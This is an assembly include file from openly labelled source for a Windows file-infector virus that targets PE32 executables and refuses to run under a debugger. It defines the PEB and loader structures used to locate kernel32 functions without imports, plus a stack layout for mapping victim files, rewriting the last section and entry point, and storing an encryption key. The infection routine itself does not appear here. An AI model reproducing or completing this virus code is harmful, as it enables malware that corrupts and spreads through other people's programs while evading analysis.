; ==========================================================================================;
; ------------------------------------------------------------------------------------------;
;     FILENAME : r0b0h0b0.inc                                                               ;
; ------------------------------------------------------------------------------------------;
;       AUTHOR : r0b0h0b0                                                                   ;
;        EMAIL : r0b0h0b0@proton.me                                                         ;
; DATE CREATED : 3/22/2023                                                                  ;
;         TEST : Windows 10 (w/out antivirus)                                               ;
;  DESCRIPTION : File infector virus for PE32 exe files in current directory.               ;
;                Will not work while being debugged.                                        ;
; ------------------------------------------------------------------------------------------;
;                   CAUTION! This is source code for a computer virus.                      ;
; ------------------------------------------------------------------------------------------;
; ==========================================================================================;

; Re-definition of internal Windows structures
; not included in Masm32
; https://msdn.microsoft.com/en-us/library/windows/desktop/aa813706.aspx
; https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708.aspx
; https://msdn.microsoft.com/en-us/library/windows/desktop/aa380518.aspx

PEB_LDR_DATA STRUCT
    Reserved1               BYTE 8 dup(?)
    Reserved2               PVOID 3 dup(?)
    InMemoryOrderModuleList LIST_ENTRY <?>
PEB_LDR_DATA ENDS

UNICODE_STRING STRUCT
    Len                     USHORT ? ; is Length, but conflicts with the LENGTH Masm keyword
    MaximumLen              USHORT ? ; is MaximumLength, for consistency
    Buffer                  PWSTR ?
UNICODE_STRING ENDS

LDR_DATA_TABLE_ENTRY STRUCT
    Reserved1               PVOID 2 dup(?)
    InMemoryOrderLinks      LIST_ENTRY <?>
    Reserved2               PVOID 2 dup(?)
    DllBase                 PVOID ?
    EntryPoint              PVOID ?
    Reserved3               PVOID ?
    FullDllName             UNICODE_STRING <?>
    Reserved4               BYTE 8 dup(?)
    Reserved5               PVOID 3 dup(?)
    ulongPointerUnion       DWORD ?
    TimeDateStamp           ULONG ?
LDR_DATA_TABLE_ENTRY ENDS

PPEB_LDR_DATA                   typedef PTR PEB_LDR_DATA
PRTL_USER_PROCESS_PARAMETERS    typedef PTR
PPS_POST_PROCESS_INIT_ROUTINE   typedef PTR

PEB STRUCT
    Reserved1               BYTE 2 dup(?)
    BeingDebugged           BYTE ?
    Reserved2               BYTE 1 dup(?)
    Reserved3               PVOID 2 dup(?)
    Ldr                     PPEB_LDR_DATA ?
    ProcessParameters       PRTL_USER_PROCESS_PARAMETERS ?
    Reserved4               BYTE 104 dup(?)
    Reserved5               PVOID 52 dup(?)
    PostProcessInitRoutine  PPS_POST_PROCESS_INIT_ROUTINE ?
    Reserved6               BYTE 128 dup(?)
    Reserved7               PVOID 1 dup(?)
    SessionId               ULONG ?
PEB ENDS

; Stack layout
; Used to make the code a little bit cleaner

STACK_STORAGE STRUCT
    fileName                BYTE MAX_PATH dup(?)
    fileStruct              WIN32_FIND_DATA <?>
    fileQueryHandle         HANDLE ?
    kernel32BaseAddr        HMODULE ?
    GetProcAddress_addr     DWORD ?
    GetProcAddress_module   HMODULE ?
    fileHandle              HANDLE ?
    fileMappingHandle       HANDLE ?
    fileView                LPVOID ?
    fileSize                DWORD ?
    filePeHeader            LPVOID ?
    fileLastSectionHeader   LPVOID ?
    offsetToDest            DWORD ?
    origEntryPoint          DWORD ?
    alignedSize             WORD ?
    cryptKey                DWORD ?
STACK_STORAGE ENDS
;;